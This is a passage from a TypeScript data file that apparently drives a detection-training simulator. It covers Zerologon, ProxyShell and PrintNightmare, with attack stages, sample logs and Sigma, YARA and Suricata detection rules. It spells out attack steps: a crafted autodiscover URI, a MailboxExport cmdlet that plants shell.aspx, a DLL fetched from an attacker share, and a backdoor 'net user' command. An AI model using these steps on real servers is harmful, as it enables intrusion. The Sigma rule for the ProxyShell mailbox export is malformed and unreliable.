        title: 'ET EXPLOIT Possible Zerologon NetrServerAuthenticate3 with All-Zero Client Challenge (CVE-2020-1472)',
        ruleCode: `alert dcerpc any any -> $HOME_NET any (msg:"CISA ED 20-04 Zerologon CVE-2020-1472 All-Zero ClientChallenge"; flow:established,to_server; content:"|00 00 00 00 00 00 00 00|"; threshold: type both, track by_src, count 20, seconds 10; sid:2030870; rev:2;)`,
        mitigation:
          'Apply the August 2020 / February 2021 Windows Server Netlogon updates and set FullSecureChannelProtection = 1 in HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters.',
      },
    },
    {
      id: 'zl-1472-2',
      no: 2,
      stageIndex: 2,
      timestamp: '01:14:04.892',
      sourceNodeId: 'dc01_netlogon_host',
      targetNodeId: 'aes_cfb8_zero_iv',
      sourceLabel: 'ANONYMOUS LOGON',
      targetLabel: 'CORP-DC01$ (NTDS.dit)',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'WinSec EID 4742',
      shortAction: 'DC$ PASSWORD WIPE',
      info: 'EventID 4742: ANONYMOUS LOGON resets CORP-DC01$ password via NetrServerPasswordSet2',
      sizeOrCode: 'EID 4742',
      severity: 'CRITICAL',
      mitreId: 'T1098',
      explanation:
        'CrowdStrike and Microsoft identify Windows Security EventID 4742 where SubjectUserName is "ANONYMOUS LOGON" and TargetUserName is a Domain Controller computer account ("CORP-DC01$") as the definitive host indicator of Zerologon.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4742</EventID></System>
  <EventData>
    <Data Name="TargetUserName">CORP-DC01$</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="SubjectUserName">ANONYMOUS LOGON</Data>
    <Data Name="SubjectDomainName">NT AUTHORITY</Data>
    <Data Name="SubjectLogonId">0x3e6</Data>
    <Data Name="PasswordLastSet">11/14/2026 01:14:04 AM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Zerologon Domain Controller Computer Account Modified by Anonymous Logon (EID 4742)',
        ruleCode: `title: Zerologon CVE-2020-1472 Domain Controller Password Reset (EventID 4742)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4742
    SubjectUserName: 'ANONYMOUS LOGON'
    PasswordLastSet|contains: ':'
  condition: selection
level: critical`,
        mitigation:
          'Monitor EventID 4742 for any modification of a Domain Controller machine account by ANONYMOUS LOGON, and EventID 5827/5828 for denied vulnerable Netlogon connections.',
      },
    },
    {
      id: 'zl-1472-3',
      no: 3,
      stageIndex: 3,
      timestamp: '01:14:09.304',
      sourceNodeId: 'aes_cfb8_zero_iv',
      targetNodeId: 'dcsync_ntds_dump',
      sourceLabel: 'CORP\\CORP-DC01$',
      targetLabel: 'NTDS.dit (DrsGetNCChanges)',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'WinSec EID 4624 & 4662',
      shortAction: 'DC$ EMPTY-HASH DCSYNC',
      info: 'Network logon (EID 4624) as CORP-DC01$ from 10.10.20.88 followed by DCSync (EID 4662)',
      sizeOrCode: 'NTLM 31d6cfe0...',
      severity: 'CRITICAL',
      mitreId: 'T1003.006',
      explanation:
        'Authenticating from a workstation IP using the Domain Controller’s own machine account (CORP-DC01$) and empty NTLM hash allows full DCSync extraction of NTDS.dit.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4624</EventID></System>
  <EventData>
    <Data Name="TargetUserName">CORP-DC01$</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="IpAddress">10.10.20.88</Data>
    <Data Name="AuthenticationPackageName">NTLM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Domain Controller Machine Account Authenticating From Non-DC IP Address',
        ruleCode: `title: Suspicious DC Machine Account Logon From Non-DC Host
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    TargetUserName|endswith: '$'
  condition: selection
level: high`,
        mitigation:
          'Reset the Domain Controller computer account password using Reset-ComputerMachinePassword and twice-rotate the krbtgt account password.',
      },
    },
  ],
};

export const PROXYSHELL_EXCHANGE_CVE_2021_34473_SCENARIO: AttackScenario = {
  id: 'proxyshell-exchange-cve-2021-34473',
  code: 'CVE-2021-34473',
  name: 'DEVCORE, Mandiant & CISA — Microsoft Exchange "ProxyShell": Autodiscover SSRF to MailboxExport Webshell',
  shortSubtitle: 'Orange Tsai (DEVCORE) · CISA AA21-265A · Mandiant · CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Discovered by Orange Tsai of DEVCORE (Pwn2Own / Black Hat 2021) and documented across Joint CISA Advisory AA21-265A, Mandiant, and Splunk SURGe, "ProxyShell" chains three flaws in on-premises Microsoft Exchange Servers: CVE-2021-34473 (pre-auth ACL bypass via /autodiscover/autodiscover.json?@foo.com/powershell/ URL path normalization), CVE-2021-34523 (Exchange PowerShell Remoting elevation of privilege via the X-Rps-CAT Common Access Token parameter), and CVE-2021-31207 (post-auth arbitrary file write via New-MailboxExportRequest). Chaining all three lets an unauthenticated attacker assign the "Mailbox Import Export" role, embed an ASPX webshell inside a draft email, and export that mailbox to C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx as SYSTEM.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Orange Tsai (DEVCORE Research) · CISA Alert AA21-265A · Mandiant & Splunk SURGe',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1059.001 (Exchange PowerShell) · T1505.003 (Web Shell)',
    },
    {
      term: '3-BUG EXPLOIT CHAIN',
      value: 'CVE-2021-34473 (Path Confusion) -> CVE-2021-34523 (PowerShell EoP) -> CVE-2021-31207 (File Write)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/autodiscover/autodiscover.json?@.../powershell -> New-MailboxExportRequest -> aspnet_client\\*.aspx',
    },
  ],
  nodes: [
    {
      id: 'proxyshell_operator',
      label: 'ProxyShell Threat Actor',
      sublabel: '198.51.100.112 (Unauthenticated HTTPS Client)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Infrastructure (APT / Ransomware Operator)',
        pidOrPort: 'HTTPS :443 -> /autodiscover/autodiscover.json',
        privilege: 'Unauthenticated External',
        artifacts: [
          'GET /autodiscover/autodiscover.json?@foo.com/powershell/?X-Rps-CAT=...',
          'Cookie: Email=autodiscover/autodiscover.json%3F@foo.com',
        ],
        description:
          'Attacker sending a crafted URL that tricks Exchange’s Frontend Client Access Service (CAS) into proxying an unauthenticated request directly to the Backend PowerShell Remoting endpoint.',
      },
    },
    {
      id: 'exchange_cas_frontend',
      label: 'Exchange Server (CAS Frontend)',
      sublabel: '172.16.15.20 (IIS :443 AutodiscoverProxy)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 + Microsoft Exchange Server 2019',
        pidOrPort: 'PID 4180 (w3wp.exe — MSExchangeAutodiscoverAppPool)',
        privilege: 'NT AUTHORITY\\SYSTEM (Frontend Proxy uses LocalMachine Cert)',
        artifacts: [
          'ExplicitLogonAddress stripping "/autodiscover/autodiscover.json?@foo.com"',
          'Backend Kerberos / SYSTEM authentication header injection',
        ],
        description:
          'Exchange Client Access Service (CAS) frontend whose Explicit-Logon regex strips "/autodiscover/autodiscover.json?@foo.com" and forwards the remaining "/powershell/" path to the backend :444 as SYSTEM.',
      },
    },
    {
      id: 'exchange_ps_remoting',
      label: 'Exchange PowerShell Backend',
      sublabel: 'w3wp.exe (:444 MSExchangePowerShellAppPool)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Exchange Remote PowerShell Runspace (WS-Management)',
        pidOrPort: 'PID 6290 (w3wp.exe — MSExchangePowerShellAppPool)',
        privilege: 'Exchange Admin (Impersonated via X-Rps-CAT Token)',
        artifacts: [
          'Query Parameter: ?X-Rps-CAT=<Serialized CommonAccessToken>',
          'Cmdlet: New-ManagementRoleAssignment -Role "Mailbox Import Export"',
        ],
        description:
          'Backend PowerShell endpoint (CVE-2021-34523) that deserializes the attacker’s X-Rps-CAT token containing the Exchange Admin’s SID, granting an administrative Exchange PowerShell session.',
      },
    },
    {
      id: 'mailbox_export_webshell',
      label: 'MailboxExport .ASPX Webshell',
      sublabel: 'C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'IIS Web Root & Exchange Mailbox Export Service',
        pidOrPort: 'MSExchangeMailboxReplication.exe -> w3wp.exe',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'Cmdlet: New-MailboxExportRequest -Mailbox admin@... -FilePath "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\shell.aspx"',
          'Encoded JScript/C# ASPX Webshell inside PST export',
        ],
        description:
          'Abusing CVE-2021-31207, New-MailboxExportRequest exports a mailbox containing a polyglot email attachment directly to a .aspx path inside C:\\inetpub\\wwwroot\\aspnet_client\\.',
      },
    },
    {
      id: 'exchange_siem_sensor',
      label: 'SIEM & Exchange Audit Sensor',
      sublabel: 'IIS Logs + MSExchange Management EID 1',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Endpoint Detection Platform',
        pidOrPort: 'IIS W3SVC1 + MSExchange Management Log + Sysmon EID 11',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'IIS URI containing "/autodiscover/autodiscover.json" and "/powershell" or "X-Rps-CAT"',
          'MSExchange Management EventID 1: New-MailboxExportRequest with .aspx FilePath',
        ],
        description:
          'Correlates the autodiscover.json path-confusion request in IIS logs with New-MailboxExportRequest writing .aspx files to aspnet_client.',
      },
    },
  ],
  processTree: [
    {
      pid: 4180,
      ppid: 1088,
      name: 'w3wp.exe (Frontend CAS :443)',
      commandLine: 'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "MSExchangeAutodiscoverAppPool"',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['RemoveExplicitLogonFromUrlAnchoredXml()', 'HttpProxyRequest("https://localhost:444/powershell/")'],
    },
    {
      pid: 6290,
      ppid: 1088,
      name: 'w3wp.exe (Backend PowerShell :444)',
      commandLine: 'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "MSExchangePowerShellAppPool"',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'CommonAccessToken.Deserialize(X-Rps-CAT)',
        'InvokeCmdlet("New-ManagementRoleAssignment", "-Role", "Mailbox Import Export")',
        'InvokeCmdlet("New-MailboxExportRequest", "-FilePath", "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\shell.aspx")',
      ],
      memoryBlocks: [
        {
          address: '0x00007FF884120000',
          section: 'MSExchangePowerShellAppPool (X-Rps-CAT Admin Context)',
          permissions: 'RW-',
          size: '96 KB',
          status: 'injected',
          description:
            'Forged Windows CommonAccessToken reconstructed from X-Rps-CAT query string with Administrator SID.',
          hexPreview: 'TokenType=Windows | Version=2 | UserSid=S-1-5-21-...-500 (Administrator)',
        },
      ],
    },
    {
      pid: 7940,
      ppid: 4180,
      name: 'cmd.exe (via aspnet_client\\shell.aspx)',
      commandLine: 'cmd.exe /c whoami && nltest /dclist:corp.local',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['CreateProcessW("cmd.exe")', 'WriteFile("shell.aspx")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'AUTODISCOVER.JSON PATH CONFUSION & ACL BYPASS (CVE-2021-34473)',
      subtitle: 'Tricking Exchange CAS Frontend into stripping /autodiscover/autodiscover.json?@foo.com and proxying /powershell/',
      description:
        'As discovered by Orange Tsai (DEVCORE), Exchange’s Frontend Client Access Service (CAS) supports an "Explicit Logon" URL feature for /autodiscover/autodiscover.json/<email>/<path>. Because the regex parser did not check that a "/" followed autodiscover.json, requesting /autodiscover/autodiscover.json?@foo.com/powershell/ (or setting Cookie: Email=autodiscover/autodiscover.json%3F@foo.com) causes the frontend proxy to strip "autodiscover/autodiscover.json?@foo.com" as the email address and proxy the remaining "/powershell/" path directly to the backend server as NT AUTHORITY\\SYSTEM!',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['proxyshell_operator', 'exchange_cas_frontend', 'exchange_siem_sensor'],
      compromisedNodeIds: ['exchange_cas_frontend'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2021-34473 (Pre-Auth Path Confusion / SSRF)' },
        { term: 'CRAFTED URI', value: '/autodiscover/autodiscover.json?@foo.com/powershell/' },
        { term: 'BACKEND TARGET', value: 'https://localhost:444/powershell/ (Authenticated as SYSTEM)' },
      ],
    },
    {
      index: 2,
      title: 'POWERSHELL X-RPS-CAT IMPERSONATION & ROLE ASSIGNMENT (CVE-2021-34523)',
      subtitle: 'Supplying a forged X-Rps-CAT CommonAccessToken to run New-ManagementRoleAssignment as Exchange Admin',
      description:
        'Once the request reaches the Backend PowerShell endpoint (:444/powershell/), it still needs a user identity because the frontend forwarded the machine account (SYSTEM) without a user token. Exploiting CVE-2021-34523, the attacker appends ?X-Rps-CAT=<Base64_CommonAccessToken> containing the Exchange Administrator’s SID (obtained via a quick legacyDN/SID lookup). The backend trusts X-Rps-CAT, opens an Exchange Admin PowerShell runspace, and executes New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "admin@corp.local".',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1059.001',
      mitreTechniqueName: 'Command and Scripting Interpreter: PowerShell',
      activeNodeIds: ['exchange_cas_frontend', 'exchange_ps_remoting', 'exchange_siem_sensor'],
      compromisedNodeIds: ['exchange_cas_frontend', 'exchange_ps_remoting'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2021-34523 (Exchange PowerShell Backend EoP)' },
        { term: 'TOKEN PARAMETER', value: '?X-Rps-CAT=<Serialized CommonAccessToken with Admin SID>' },
        { term: 'ADMIN CMDLET', value: 'New-ManagementRoleAssignment -Role "Mailbox Import Export"' },
      ],
    },
    {
      index: 3,
      title: 'NEW-MAILBOXEXPORTREQUEST ARBITRARY .ASPX WEBSHELL WRITE (CVE-2021-31207)',
      subtitle: 'Exporting a PST mailbox containing an encoded ASPX webshell into C:\\inetpub\\wwwroot\\aspnet_client\\',
      description:
        'Finally, the attacker sends an email draft containing an encoded JScript/C# ASPX webshell payload, and runs New-MailboxExportRequest -Mailbox admin@corp.local -FilePath "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\shell.aspx" (CVE-2021-31207). Although Exchange exports a binary .PST file, ASP.NET parses any <%= ... %> or <script runat="server"> block inside the file regardless of binary PST headers—giving the attacker an unauthenticated SYSTEM webshell at https://mail.corp.local/aspnet_client/shell.aspx!',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1505.003',
      mitreTechniqueName: 'Server Software Component: Web Shell',
      activeNodeIds: ['proxyshell_operator', 'exchange_ps_remoting', 'mailbox_export_webshell', 'exchange_siem_sensor'],
      compromisedNodeIds: ['exchange_cas_frontend', 'exchange_ps_remoting', 'mailbox_export_webshell'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2021-31207 (Arbitrary File Write via MailboxExport)' },
        { term: 'EXPORT CMDLET', value: 'New-MailboxExportRequest -FilePath "\\\\127.0.0.1\\c$\\...\\shell.aspx"' },
        { term: 'POLYGLOT TRICK', value: 'PST file containing valid <script runat="server"> ASPX code' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'pshell-1',
      no: 1,
      stageIndex: 1,
      timestamp: '03:19:44.102',
      sourceNodeId: 'proxyshell_operator',
      targetNodeId: 'exchange_cas_frontend',
      sourceLabel: '198.51.100.112',
      targetLabel: 'Exchange IIS :443',
      sourceType: 'NETWORK',
      protocolOrEventId: 'IIS W3SVC HTTP 200',
      shortAction: 'AUTODISCOVER PATH BYPASS',
      info: 'POST /autodiscover/autodiscover.json?@foo.com/powershell/?X-Rps-CAT=... (CVE-2021-34473)',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'CISA AA21-265A and Mandiant highlight IIS logs containing /autodiscover/autodiscover.json combined with /powershell or /mapi/nspi and X-Rps-CAT.',
      rawLog: `2021-08-22 03:19:44 172.16.15.20 POST /autodiscover/autodiscover.json @foo.com/powershell/&X-Rps-CAT=VgEAVAdXaW5kb3dz... 443 - 198.51.100.112 Python-urllib/3.9 200 0 0 184`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Microsoft Exchange ProxyShell SSRF & PowerShell Access via Autodiscover (CVE-2021-34473)',
        ruleCode: `title: ProxyShell Exploitation via Autodiscover.json (CVE-2021-34473)
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains: '/autodiscover/autodiscover.json'
    cs-uri-query|contains:
      - '/powershell'
      - '/mapi/'
      - 'X-Rps-CAT'
  condition: selection
level: critical`,
        mitigation:
          'Apply Microsoft Exchange Cumulative Updates and May/July 2021 Security Updates (KB5001779 / KB5004779).',
      },
    },
    {
      id: 'pshell-2',
      no: 2,
      stageIndex: 2,
      timestamp: '03:19:46.519',
      sourceNodeId: 'exchange_cas_frontend',
      targetNodeId: 'exchange_ps_remoting',
      sourceLabel: 'w3wp.exe (PowerShell :444)',
      targetLabel: 'MSExchange Management Log',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'MSExchange Mgmt EID 1',
      shortAction: 'MAILBOX EXPORT CMDLET',
      info: 'New-MailboxExportRequest executed with -FilePath "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\shell.aspx"',
      sizeOrCode: 'EID 1 Cmdlet',
      severity: 'CRITICAL',
      mitreId: 'T1059.001',
      explanation:
        'In the MSExchange Management event log, EventID 1 records the execution of New-ManagementRoleAssignment followed by New-MailboxExportRequest pointing to a .aspx file path.',
      rawLog: `[MSExchange Management] EventID=1Cmdlet="New-MailboxExportRequest"
Parameters: -Mailbox "admin@corp.local" -FilePath "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\shell.aspx"
Caller="CORP.LOCAL/Users/Administrator (via X-Rps-CAT)"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Exchange New-MailboxExportRequest Writing .ASPX Webshell (CVE-2021-31207)',
        ruleCode: `title: Suspicious Exchange Mailbox Export to Web Directory (ProxyShell)
logsource:
  product: windows
  service: msexchange-management
detection:
  selection:
     '|all':
      - 'New-MailboxExportRequest'
      - '-FilePath'
    '|contains':
      - '.aspx'
      - 'wwwroot'
      - 'aspnet_client'
  condition: selection
level: critical`,
        mitigation:
          'Audit MSExchange Management logs for unauthorized Mailbox Import Export role assignments and New-MailboxExportRequest cmdlets.',
      },
    },
    {
      id: 'pshell-3',
      no: 3,
      stageIndex: 3,
      timestamp: '03:19:51.804',
      sourceNodeId: 'exchange_ps_remoting',
      targetNodeId: 'mailbox_export_webshell',
      sourceLabel: 'w3wp.exe (IIS)',
      targetLabel: 'aspnet_client\\shell.aspx',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 & 11',
      shortAction: 'ASPX WEBSHELL EXEC',
      info: 'FileCreate C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx followed by w3wp.exe spawning cmd.exe',
      sizeOrCode: 'SYSTEM Shell',
      severity: 'CRITICAL',
      mitreId: 'T1505.003',
      explanation:
        'Once the PST/ASPX polyglot file lands in C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx, an HTTP POST request triggers w3wp.exe to spawn cmd.exe as NT AUTHORITY\\SYSTEM.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>11</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\MSExchangeMailboxReplication.exe</Data>
    <Data Name="TargetFilename">C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'YARA',
        title: 'CISA AA21-265A YARA — PST Polyglot ASPX Webshell in IIS Webroot',
        ruleCode: `rule CISA_ProxyShell_PST_Polyglot_Webshell {
  meta:
    author = "CISA AA21-265A / Mandiant"
    cve = "CVE-2021-34473"
  strings:
    $pst_magic = { 21 42 44 4E }
    $aspx1 = "Page Language=" ascii nocase
    $aspx2 = "Request[" ascii nocase
  condition:
    $pst_magic at 0 and 1 of ($aspx*)
}`,
        mitigation:
          'Scan C:\\inetpub\\wwwroot\\aspnet_client\\ and Exchange OWA directories for files beginning with the PST header (!BDN / 0x2142444E) that have a .aspx extension.',
      },
    },
  ],
};

export const PRINTNIGHTMARE_SPOOLER_CVE_2021_34527_SCENARIO: AttackScenario = {
  id: 'printnightmare-spooler-cve-2021-34527',
  code: 'CVE-2021-34527',
  name: 'Microsoft, Rapid7 & Elastic — Windows "PrintNightmare": RpcAddPrinterDriverEx Remote SYSTEM RCE',
  shortSubtitle: 'Microsoft MSRC · Rapid7 · Elastic Security Labs · MS-RPRN APD_INSTALL_WARNED_DRIVER (0x8000) Bypass',
  category: 'ACTIVE_DIRECTORY',
  severity: 'CRITICAL',
  primaryMitrePhase: 2,
  overview:
    'Documented by Microsoft MSRC, Rapid7, Elastic Security Labs, and CISA (June–July 2021), "PrintNightmare" (CVE-2021-34527 / CVE-2021-1675) is a critical remote code execution vulnerability in the Windows Print Spooler service (spoolsv.exe, enabled by default on all Windows workstations, servers, and Domain Controllers). In the MS-RPRN RPC function RpcAddPrinterDriverEx(), setting bit 0x8000 (APD_INSTALL_WARNED_DRIVER) inside dwFileCopyFlags caused spoolsv.exe to skip the ValidateObjectAccess() administrator permission check completely—allowing any low-privilege domain user to instruct a remote server or Domain Controller’s spoolsv.exe (running as NT AUTHORITY\\SYSTEM) to fetch a malicious DLL over SMB/UNC and load it straight into SYSTEM memory.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Microsoft MSRC · Rapid7 AttackerKB · Elastic Security Labs · CISA AA21-200B',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1210 (Exploitation of Remote Services) · T1547.012 (Print Processors / Drivers) · T1068 (SYSTEM EoP)',
    },
    {
      term: 'RPC BYPASS FLAG',
      value: 'RpcAddPrinterDriverEx(dwFileCopyFlags = 0x8014 -> APD_INSTALL_WARNED_DRIVER 0x8000)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'RPC \\pipe\\spoolss -> spoolsv.exe writing & loading C:\\Windows\\System32\\spool\\drivers\\x64\\3\\*.dll',
    },
  ],
  nodes: [
    {
      id: 'printnightmare_user',
      label: 'Low-Privilege Domain User',
      sublabel: '10.10.20.55 (SMB Share + RPC Caller)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Authenticated Domain User + Attacker SMB Share (\\\\10.10.20.55\\share\\evil.dll)',
        pidOrPort: 'SMB :445 (\\pipe\\spoolss — MS-RPRN / MS-PAR)',
        privilege: 'Standard Domain User (Any Authenticated User)',
        artifacts: [
          'DRIVER_CONTAINER (pConfigFile = "\\\\10.10.20.55\\share\\evil.dll")',
          'dwFileCopyFlags = 0x8014 (APD_INSTALL_WARNED_DRIVER | APD_COPY_ALL_FILES)',
        ],
        description:
          'Low-privilege user calling RpcAddPrinterDriverEx over \\pipe\\spoolss with dwFileCopyFlags = 0x8014 and pointing pConfigFile to an attacker-hosted UNC DLL.',
      },
    },
    {
      id: 'target_spoolsv_server',
      label: 'Target Server / DC (spoolsv.exe)',
      sublabel: '10.10.0.5 (Windows Print Spooler Service)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 / Domain Controller (spoolsv.exe)',
        pidOrPort: 'PID 2184 (C:\\Windows\\System32\\spoolsv.exe)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'localspl.dll!SplAddPrinterDriverEx()',
          'Bypassed ValidateObjectAccess(SPOOLER_OBJECT_SERVER)',
        ],
        description:
          'Windows Print Spooler service running as SYSTEM; when bit 0x8000 (APD_INSTALL_WARNED_DRIVER) is set, localspl.dll skips the administrator check.',
      },
    },
    {
      id: 'spool_driver_dll_load',
      label: 'Driver DLL Load in spoolsv.exe',
      sublabel: 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'SYSTEM Process DLL Execution (spoolsv.exe)',
        pidOrPort: 'PID 2184 (LoadLibraryW on pConfigFile DLL)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\New\\evil.dll',
          'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\1\\evil.dll',
        ],
        description:
          'spoolsv.exe copies the attacker’s DLL into C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ and immediately calls LoadLibraryW() + DrvConvertDevMode() as SYSTEM.',
      },
    },
    {
      id: 'system_domain_takeover',
      label: 'SYSTEM Shell / Local Admin Creation',
      sublabel: 'DllMain -> cmd.exe / SAM / AD Takeover',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Tier-0 SYSTEM Execution Context',
        pidOrPort: 'PID 8104 (Child of spoolsv.exe)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'PrintService Operational EventID 316 & 808',
          'Full SYSTEM control on target Server / Domain Controller',
        ],
        description:
          'The malicious printer driver DLL executes DllMain inside spoolsv.exe as NT AUTHORITY\\SYSTEM, spawning a reverse shell or creating a Domain Admin user.',
      },
    },
    {
      id: 'spooler_edr_siem',
      label: 'Elastic EDR & SIEM Sensor',
      sublabel: 'Sysmon EID 1/7/11 & PrintService EID 316',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Endpoint Detection Platform',
        pidOrPort: 'Sysmon EventID 7/11 + Microsoft-Windows-PrintService/Admin EID 316',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'spoolsv.exe loading unsigned DLL from \\spool\\drivers\\x64\\3\\',
          'spoolsv.exe spawning cmd.exe / powershell.exe / rundll32.exe',
        ],
        description:
          'Correlates SMB \\pipe\\spoolss RPC calls with spoolsv.exe writing and loading unsigned DLLs in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\.',
      },
    },
  ],
  processTree: [
    {
      pid: 2184,
      ppid: 612,
      name: 'spoolsv.exe (Print Spooler)',
      commandLine: 'C:\\Windows\\System32\\spoolsv.exe',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'RpcAddPrinterDriverEx(dwFileCopyFlags=0x8014)',
        'SplAddPrinterDriverEx()',
        'CopyFileW("\\\\10.10.20.55\\share\\evil.dll", "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\New\\evil.dll")',
      ],
    },
    {
      pid: 2184,
      ppid: 612,
      name: 'spoolsv.exe -> evil.dll (Loaded)',
      commandLine: 'LoadLibraryW("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\1\\evil.dll")',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: ['LoadLibraryW("evil.dll")', 'DrvConvertDevMode()', 'DllMain(DLL_PROCESS_ATTACH)'],
      memoryBlocks: [
        {
          address: '0x00007FF899400000',
          section: 'evil.dll (Malicious Printer Config DLL in spoolsv.exe)',
          permissions: 'R-X',
          size: '72 KB',
          status: 'injected',
          description:
            'Unsigned DLL copied from attacker UNC share and loaded directly into the SYSTEM spoolsv.exe process.',
          hexPreview: 'MZ... DllMain -> CreateProcessW("cmd.exe /c net user ...")',
        },
      ],
    },
    {
      pid: 8104,
      ppid: 2184,
      name: 'cmd.exe (Child of spoolsv.exe)',
      commandLine: 'cmd.exe /c net user pnightmare P@ssw0rd123! /add && net localgroup administrators pnightmare /add',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['CreateProcessW("net.exe")', 'SamrCreateUser2InDomain()'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'RPCADDPRINTERDRIVEREX AUTH BYPASS VIA 0x8000 FLAG (CVE-2021-34527)',
      subtitle: 'Passing APD_INSTALL_WARNED_DRIVER (0x8000) over \\pipe\\spoolss to skip ValidateObjectAccess()',
      description:
        'A low-privilege domain user connects to a remote Windows Server or Domain Controller over SMB named pipe \\pipe\\spoolss (MS-RPRN protocol) and calls RpcAddPrinterDriverEx(). Normally, localspl.dll calls ValidateObjectAccess() to verify that the caller is a Server Administrator. However, when the caller sets bit 0x8000 (APD_INSTALL_WARNED_DRIVER) in dwFileCopyFlags (if ((dwFileCopyFlags & 0x8000) == 0) ValidateObjectAccess(...)), spoolsv.exe skips the administrator check completely!',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1210',
      mitreTechniqueName: 'Exploitation of Remote Services',
      activeNodeIds: ['printnightmare_user', 'target_spoolsv_server', 'spooler_edr_siem'],
      compromisedNodeIds: ['target_spoolsv_server'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2021-34527 ("PrintNightmare" MS-RPRN / MS-PAR)' },
